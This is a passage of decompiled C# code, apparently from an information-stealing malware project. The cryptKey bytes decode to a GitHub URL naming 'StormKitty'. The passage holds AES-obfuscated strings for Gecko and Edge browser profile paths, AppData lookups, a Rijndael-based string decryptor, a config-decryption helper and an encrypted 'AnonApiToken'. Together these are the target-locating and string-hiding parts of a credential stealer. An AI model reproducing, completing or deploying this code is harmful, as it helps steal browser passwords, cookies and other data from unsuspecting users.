					189,
					202,
					185,
					182,
					67,
					39,
					65,
					51,
					52,
					173,
					18,
					238,
					176
				}),
				Program.Paths.StringsCrypt.Decrypt(new byte[]
				{
					199,
					54,
					29,
					56,
					170,
					241,
					14,
					100,
					162,
					6,
					72,
					161,
					113,
					24,
					82,
					202,
					17,
					115,
					136,
					234,
					7,
					212,
					113,
					6,
					151,
					135,
					75,
					247,
					247,
					173,
					203,
					24
				}),
				Program.Paths.StringsCrypt.Decrypt(new byte[]
				{
					83,
					72,
					133,
					227,
					83,
					110,
					30,
					229,
					236,
					41,
					214,
					6,
					199,
					29,
					46,
					177,
					241,
					54,
					120,
					70,
					151,
					178,
					31,
					141,
					61,
					90,
					213,
					35,
					23,
					246,
					13,
					83
				}),
				Program.Paths.StringsCrypt.Decrypt(new byte[]
				{
					104,
					246,
					234,
					64,
					237,
					165,
					148,
					53,
					5,
					137,
					111,
					113,
					171,
					60,
					134,
					245,
					123,
					46,
					6,
					132,
					64,
					48,
					18,
					15,
					251,
					4,
					115,
					37,
					170,
					131,
					50,
					128
				}),
				Program.Paths.StringsCrypt.Decrypt(new byte[]
				{
					133,
					151,
					179,
					byte.MaxValue,
					133,
					211,
					180,
					66,
					84,
					153,
					153,
					102,
					25,
					119,
					175,
					75,
					37,
					11,
					232,
					242,
					215,
					134,
					15,
					104,
					97,
					24,
					243,
					15,
					72,
					21,
					214,
					148
				}),
				Program.Paths.StringsCrypt.Decrypt(new byte[]
				{
					101,
					40,
					56,
					105,
					89,
					211,
					223,
					54,
					3,
					104,
					25,
					89,
					1,
					122,
					183,
					190,
					84,
					174,
					204,
					213,
					56,
					142,
					216,
					145,
					19,
					148,
					221,
					119,
					63,
					0,
					14,
					109
				}),
				Program.Paths.StringsCrypt.Decrypt(new byte[]
				{
					175,
					246,
					73,
					246,
					49,
					254,
					11,
					23,
					218,
					203,
					11,
					198,
					89,
					205,
					176,
					84,
					56,
					68,
					227,
					191,
					99,
					91,
					219,
					129,
					239,
					50,
					148,
					130,
					220,
					188,
					164,
					21
				}),
				Program.Paths.StringsCrypt.Decrypt(new byte[]
				{
					75,
					24,
					125,
					65,
					43,
					53,
					196,
					162,
					16,
					125,
					167,
					152,
					46,
					91,
					169,
					88,
					249,
					110,
					125,
					80,
					24,
					9,
					189,
					218,
					64,
					40,
					44,
					44,
					182,
					21,
					14,
					72,
					150,
					141,
					179,
					43,
					1,
					75,
					180,
					171,
					191,
					237,
					98,
					81,
					222,
					4,
					48,
					130
				})
			};

			// Token: 0x0400012C RID: 300
			public static string[] sGeckoBrowserPaths = new string[]
			{
				Program.Paths.StringsCrypt.Decrypt(new byte[]
				{
					25,
					165,
					254,
					213,
					23,
					104,
					22,
					140,
					50,
					180,
					13,
					111,
					144,
					203,
					43,
					22,
					130,
					192,
					203,
					173,
					216,
					174,
					203,
					198,
					119,
					247,
					195,
					48,
					28,
					15,
					102,
					251
				}),
				Program.Paths.StringsCrypt.Decrypt(new byte[]
				{
					57,
					61,
					215,
					94,
					116,
					76,
					131,
					196,
					108,
					135,
					85,
					159,
					219,
					37,
					127,
					47
				}),
				Program.Paths.StringsCrypt.Decrypt(new byte[]
				{
					131,
					14,
					byte.MaxValue,
					168,
					2,
					46,
					205,
					11,
					17,
					125,
					39,
					71,
					131,
					241,
					39,
					192
				}),
				Program.Paths.StringsCrypt.Decrypt(new byte[]
				{
					78,
					198,
					187,
					164,
					195,
					98,
					111,
					181,
					201,
					137,
					136,
					6,
					94,
					66,
					48,
					57
				}),
				Program.Paths.StringsCrypt.Decrypt(new byte[]
				{
					15,
					197,
					238,
					219,
					54,
					25,
					176,
					66,
					84,
					247,
					8,
					76,
					207,
					35,
					202,
					142,
					147,
					45,
					233,
					227,
					100,
					60,
					238,
					136,
					160,
					192,
					140,
					59,
					107,
					214,
					244,
					202
				}),
				Program.Paths.StringsCrypt.Decrypt(new byte[]
				{
					153,
					86,
					193,
					227,
					188,
					184,
					28,
					41,
					79,
					37,
					113,
					236,
					3,
					244,
					237,
					150,
					134,
					53,
					212,
					66,
					69,
					82,
					197,
					61,
					225,
					15,
					130,
					151,
					189,
					246,
					126,
					205
				}),
				Program.Paths.StringsCrypt.Decrypt(new byte[]
				{
					196,
					189,
					143,
					56,
					114,
					249,
					19,
					12,
					92,
					176,
					156,
					66,
					203,
					221,
					53,
					72,
					131,
					177,
					110,
					160,
					95,
					218,
					63,
					31,
					217,
					46,
					132,
					4,
					211,
					175,
					216,
					239
				}),
				Program.Paths.StringsCrypt.Decrypt(new byte[]
				{
					156,
					253,
					178,
					143,
					188,
					39,
					142,
					60,
					241,
					99,
					247,
					116,
					211,
					99,
					5,
					119,
					40,
					243,
					72,
					59,
					0,
					175,
					243,
					243,
					94,
					202,
					67,
					206,
					126,
					176,
					47,
					182,
					145,
					87,
					37,
					85,
					76,
					138,
					57,
					238,
					162,
					167,
					29,
					248,
					230,
					180,
					133,
					57
				})
			};

			// Token: 0x0400012D RID: 301
			public static string EdgePath = Program.Paths.StringsCrypt.Decrypt(new byte[]
			{
				156,
				195,
				223,
				143,
				60,
				17,
				189,
				byte.MaxValue,
				52,
				135,
				177,
				35,
				20,
				86,
				6,
				119,
				131,
				100,
				33,
				246,
				174,
				234,
				146,
				72,
				65,
				90,
				212,
				244,
				233,
				203,
				145,
				176
			});

			// Token: 0x0400012E RID: 302
			public static string appdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

			// Token: 0x0400012F RID: 303
			public static string lappdata = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);

			// Token: 0x02000040 RID: 64
			internal sealed class StringsCrypt
			{
				// Token: 0x060000DA RID: 218 RVA: 0x00008B8C File Offset: 0x00006D8C
				public static string Decrypt(byte[] bytesToBeDecrypted)
				{
					byte[] bytes = null;
					using (MemoryStream memoryStream = new MemoryStream())
					{
						using (RijndaelManaged rijndaelManaged = new RijndaelManaged())
						{
							rijndaelManaged.KeySize = 256;
							rijndaelManaged.BlockSize = 128;
							Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(Program.Paths.StringsCrypt.cryptKey, Program.Paths.StringsCrypt.saltBytes, 1000);
							rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
							rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
							rijndaelManaged.Mode = CipherMode.CBC;
							using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Write))
							{
								cryptoStream.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);
								cryptoStream.Close();
							}
							bytes = memoryStream.ToArray();
						}
					}
					return Encoding.UTF8.GetString(bytes);
				}

				// Token: 0x060000DB RID: 219 RVA: 0x000029C2 File Offset: 0x00000BC2
				public static string DecryptConfig(string value)
				{
					if (string.IsNullOrEmpty(value))
					{
						return "";
					}
					if (!value.StartsWith("ENCRYPTED:"))
					{
						return value;
					}
					return Program.Paths.StringsCrypt.Decrypt(Convert.FromBase64String(value.Replace("ENCRYPTED:", "")));
				}

				// Token: 0x04000130 RID: 304
				private static readonly byte[] saltBytes = new byte[]
				{
					byte.MaxValue,
					64,
					191,
					111,
					23,
					3,
					113,
					119,
					231,
					121,
					252,
					112,
					79,
					32,
					114,
					156
				};

				// Token: 0x04000131 RID: 305
				private static readonly byte[] cryptKey = new byte[]
				{
					104,
					116,
					116,
					112,
					115,
					58,
					47,
					47,
					103,
					105,
					116,
					104,
					117,
					98,
					46,
					99,
					111,
					109,
					47,
					76,
					105,
					109,
					101,
					114,
					66,
					111,
					121,
					47,
					83,
					116,
					111,
					114,
					109,
					75,
					105,
					116,
					116,
					121
				};

				// Token: 0x04000132 RID: 306
				public static string github = Encoding.UTF8.GetString(Program.Paths.StringsCrypt.cryptKey);

				// Token: 0x04000133 RID: 307
				public static string AnonApiToken = Program.Paths.StringsCrypt.Decrypt(new byte[]
				{
					169,
					182,
					79,
					179,
					252,
					54,
					138,
					148,
					167,
					99,
					216,
					216,
					199,
					219,
					10,
					249,
					131,
					166,
					170,
					145,
					237,
					248,
					142,
					78,
					196,
					137,
					101,
					62,
					142,
					107,
					245,
					134
				});
			}
		}
	}
}
